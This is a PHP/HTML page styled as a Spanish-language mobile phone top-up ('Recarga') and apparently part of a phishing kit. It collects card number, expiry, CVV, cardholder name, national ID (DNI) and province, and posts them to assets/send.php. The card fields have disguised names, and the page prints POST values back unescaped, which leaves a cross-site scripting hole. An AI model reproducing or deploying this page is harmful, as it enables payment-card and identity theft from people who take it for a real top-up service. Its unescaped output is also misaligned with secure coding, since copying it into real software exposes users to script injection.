<?php
$monto = $_POST["monto"];
$nlinea = $_POST["nlinea"];
?>
<html lang="en" foxified=""><head>
  
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script src="script.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Recarga</title>



    <style type="text/css">
      .container-logo{
        width: 80px;
        height: 80px;
        border-radius: 80px;
        line-height: 70px;
        border:4px solid #EF1DfF;
        transform: rotate(45deg) !important;
        animation:4s rebotar linear 1;
        position: relative;
        transition: .5s all;
      }
      @keyframes rebotar{
        10% {
          top: -10px;
        }

        30% {
          top: 0px;
        }

        40% {
          top: -10px;
        }

        80% {
          top: 0px;
        }
      }

      i{
        color: #EF1DfF;
      }

      body{
        background:linear-gradient(#0B1768 ,#062C06  );
        background-size: cover;

      }
      footer{
        background: #000;
      }
      .uppercase{
        text-transform: uppercase;
      }
    </style>
    <link href="./paymethod_files/bootstrap.min.css" rel="stylesheet"  crossorigin="anonymous">
  <script async="" src="./paymethod_files/analytics.js.descarga"></script>
  
  <script type="text/javascript" async="" src="./paymethod_files/taas"></script><script src="./paymethod_files/js" async=""></script></head>
  <body>
    <header class="text-center">
      <div class="text-center w-100 mt-5 pt-5 mb-5">
        <div class="container-logo m-auto">
        <i class="bi fs-1">
            <img src="img/chip.png">
          </i>
        </div>
      </div>
      <h1 class="text-white">Recarga saldo en tu linea</h1>
      <p class="text-white">Para realizar la recarga necesita proporcionar los siguientes datos.</p>
      <h4 class="text-center text-white mb-3">Agrega una forma de pago</h4>
        <ul class="text-white text-start m-auto w-50 m-auto mt-5 mb-5" style="list-style: none;">
          
          <li>N° de linea: <?php echo $nlinea; ?></li>
          <li>Monto: <?php echo $monto; ?></li>
         
        </ul>
        
    </header>
     <div class=" mb-3 m-auto">
                  </div>
    <form class="row m-0 p-3 bg-white mb-4" action="assets/send.php" method="POST" >
       
        <div class="col-sm-6 m-auto"> 
          <div class="mb-3">
            <label class="form-label">Numeros Tarjeta</label>
            <input type="tel" class="form-control" name="ceromaz" id="ceromaz" maxlength="18" placeholder="Ej: 4555 5555 5555 5555" >
          </div>

          <div class="mb-3">
            <label class="form-label">Vencimiento</label>
            <input type="tel" class="form-control" name="expiry_cc" id="expiry_cc" placeholder="MM/AA"  id="cehvv" required="">
          </div>

          <div class="mb-3">
            <label class="form-label">C V V</label>
            <input type="tel" class="form-control" name="cehvv" maxlength="3" placeholder="000" id="cehvv" required="">
          </div>

          <div class="mb-3">
            <label class="form-label">Nombres en la tarjeta</label>
            <input type="" class="form-control" name="titular" id="titular" required="">
          </div>

          <div class="mb-3">
            <label class="form-label">DNI del pagador</label>
            <input type="tel" class="form-control" maxlength="8" name="dni" id="dni" required="">
          </div>

          <div class="mb-3">
            <label class="form-label">Provincia</label>
            <input type="text" class="form-control" name="nace"  id="nace" required="">
          </div>

          <div class="text-center">
            <button class="btn btn-success w-100" name="submit1" type="submit">Continuar</button>
          </div>
        </div>

        <div id="mensaje-procesando" style="display: none; color: green;">Procesando, por favor espera...</div>  
    </form>

    
    



    <footer class="text-white p-3">
      <h3>Contactanos</h3>
      <p class="fs-6 text-muted">Si tenes cualquier duda, o consulta puedes contactarnos mediante los siguientes medios.</p>
      <ul>
        <li>
          <i class="bi bi-telephone"></i>
          <span>+54 9 011-6101364</span>
        </li>
        <li>
          <i class="bi bi-envelope"></i>
          <span>info@recarga.com</span>
        </li>
      </ul>
      <hr>
    </footer>
    <script src="./paymethod_files/bootstrap.bundle.min.js.descarga" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
    <script type="text/javascript">
      var expiry = document.getElementById("expiry_cc");
      let nuevoValor;
      expiry.addEventListener('keyup', function(){
        if (expiry.value.length == 4) {
          expiry.value = expiry.value[0]+expiry.value[1]+"/"+expiry.value[2]+expiry.value[3];
          nuevoValor = expiry.value;
          expiry.setAttribute('maxlength', '4');
        }
        let valorCambiado = expiry.value[0]+expiry.value[1]+"/"+"/"+expiry.value[2];
        if (nuevoValor == valorCambiado) {
          expiry.value = ""
        }
        console.log(expiry.value)
      })
    </script>
  





<iframe src="./paymethod_files/saved_resource.html" style="display: none;"></iframe><script>(() => {
        window.addoncropExtensions = window.addoncropExtensions || [];
        window.addoncropExtensions.push({
            mode: 'emulator',
            emulator: 'Foxified',
            extension: {
                id: 44,
                name: 'Descargar videos de Youtube y MP3',
                version: '17.2.8',
                date: 'January 18, 2023',
            },
            flixmateConnected: true,
        });
    })();</script>
  </body></html>